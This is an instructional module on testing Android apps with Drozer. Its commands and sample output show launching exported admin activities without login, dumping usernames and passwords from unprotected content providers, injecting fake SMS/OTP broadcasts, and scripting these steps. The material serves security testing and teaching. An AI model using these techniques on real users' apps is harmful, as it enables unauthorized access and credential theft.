# Module 08: Scanning Vulnerability with Drozer - Dynamic Analysis

## What is Dynamic Analysis with Drozer?

Dynamic analysis means testing the app while it is running. Instead of just looking at the code, you interact with the app and observe its behavior. Drozer excels at dynamic analysis because it can interact with app components directly.

## Setting Up Drozer for Dynamic Analysis

### Step 1: Install Agent and Connect

```
# Install agent
adb install drozer-agent.apk

# Forward port
adb forward tcp:31415 tcp:31415

# Connect console
drozer console connect
```

### Step 2: Find the Target App

```
dz> run app.package.list -f target
com.example.targetapp
```

### Step 3: Map the Attack Surface

```
dz> run app.package.attacksurface com.example.targetapp
```

## Testing Exported Components Dynamically

### Testing Activities

Activities are the screens of the app. Exported activities can be launched by any app (including Drozer).

**Step 1: List all activities**

```
dz> run app.activity.info -a com.example.targetapp
```

**Output:**
```
Package: com.example.targetapp
  com.example.targetapp.MainActivity
  com.example.targetapp.LoginActivity (exported)
  com.example.targetapp.AdminActivity (exported)
  com.example.targetapp.SettingsActivity
```

**Step 2: Start an exported activity**

```
dz> run app.activity.start --component com.example.targetapp com.example.targetapp.AdminActivity
```

**What happens:**
Drozer tells Android to start the AdminActivity. If the activity is exported, it opens directly - even if the user is not logged in. This is a security issue because the developer expected only logged-in users to access it.

**Security finding:**
The AdminActivity should require authentication but is exported. Any app can launch it.

### Testing Services

Services run in the background. Exported services can be started by any app.

**Step 1: List services**

```
dz> run app.service.info -a com.example.targetapp
```

**Output:**
```
Package: com.example.targetapp
  com.example.targetapp.SyncService (exported)
  com.example.targetapp.BackupService (exported)
```

**Step 2: Start a service**

```
dz> run app.service.start --component com.example.targetapp com.example.targetapp.BackupService
```

**Step 3: Check for data leakage**

If the BackupService backs up data without authentication, sensitive data could be exposed. Check the service behavior.

### Testing Content Providers

Content Providers share data. Exported providers can be queried by any app.

**Step 1: List providers**

```
dz> run app.provider.info -a com.example.targetapp
```

**Output:**
```
Package: com.example.targetapp
Authority: com.example.targetapp.database
Read Permission: null
Write Permission: null
Content URIs:
  content://com.example.targetapp.database/
  content://com.example.targetapp.database/users
  content://com.example.targetapp.database/notes
```

**Step 2: Query the provider**

```
dz> run app.provider.query content://com.example.targetapp.database/users
```

**Output:**
```
id | username | password      | email
1  | admin    | admin123      | admin@example.com
2  | user1    | password1     | user1@example.com
3  | user2    | secretpass    | user2@example.com
```

**Security finding:**
The content provider is exported with no read permission. All user data (including passwords) is accessible by any app.

### Testing Broadcast Receivers

Broadcast Receivers listen for system events. Exported receivers can receive broadcasts from any app.

**Step 1: List receivers**

```
dz> run app.broadcast.info -a com.example.targetapp
```

**Output:**
```
Package: com.example.targetapp
  com.example.targetapp.SmsReceiver (exported)
```

**Step 2: Send a broadcast**

```
dz> run app.broadcast.send --component com.example.targetapp com.example.targetapp.SmsReceiver
    --extra string action "incoming_sms"
    --extra string number "1234567890"
    --extra string message "Your OTP is 123456"
```

**What happens:**
The SmsReceiver might process this as a real SMS. It could log the OTP or show it in a notification. This simulates injecting fake SMS data into the app.

## Dynamic Attack Workflows

### Workflow 1: Data Theft via Content Provider

```
1. Query the provider to see available data
2. Find sensitive tables (users, passwords, tokens)
3. Extract all data
4. Export to a file for analysis
```

### Workflow 2: Privilege Escalation via Activity

```
1. List exported activities
2. Find admin/debug activities
3. Launch them directly
4. Access privileged functionality without login
```

### Workflow 3: Malicious Data Injection

```
1. Find exported provider with write permission
2. Insert malicious data (SQL injection, XSS)
3. Check if app displays or processes the data
4. Exploit the injected data
```

## Real Dynamic Analysis Example

**Target:** com.example.notepad

**Step 1:** Map attack surface
```
dz> run app.package.attacksurface com.example.notepad
Attack Surface:
  1 activity exported
  0 services exported
  1 content providers exported
  0 broadcast receivers exported
```

**Step 2:** List activities
```
dz> run app.activity.info -a com.example.notepad
com.example.notepad.MainActivity (exported=true)
com.example.notepad.NoteEditActivity (exported=true)
```

**Step 3:** Launch NoteEditActivity directly
```
dz> run app.activity.start --component com.example.notepad com.example.notepad.NoteEditActivity
```

**Result:** The note editor opens without authentication. Users can create and edit notes without logging in.

**Step 4:** Query the content provider
```
dz> run app.provider.query content://com.example.notepad/notes
id | title      | content              | created_at
1  | Passwords  | Gmail: pass123       | 2024-01-01
2  | Bank PIN   | PIN: 4321            | 2024-01-02
3  | Secret     | Meeting at 5 PM      | 2024-01-03
```

**Result:** All notes are accessible without authentication. Sensitive data is exposed.

## Automating Dynamic Analysis

Drozer commands can be chained using scripts.

**Batch script for automated testing:**
```
# Save as test_app.dz
run app.package.attacksurface com.example.targetapp
run app.activity.info -a com.example.targetapp
run app.provider.info -a com.example.targetapp
run app.provider.query content://com.example.targetapp/users
run app.provider.query content://com.example.targetapp/notes
```

**Run the script:**
```
drozer console connect -c "run script.dz"
```

## Summary

Drozer dynamic analysis involves interacting with running app components. You can start exported activities without authentication, query content providers for data, start services, and send broadcasts. Dynamic testing reveals vulnerabilities that are not visible in static code analysis, such as unprotected activities and accessible data providers.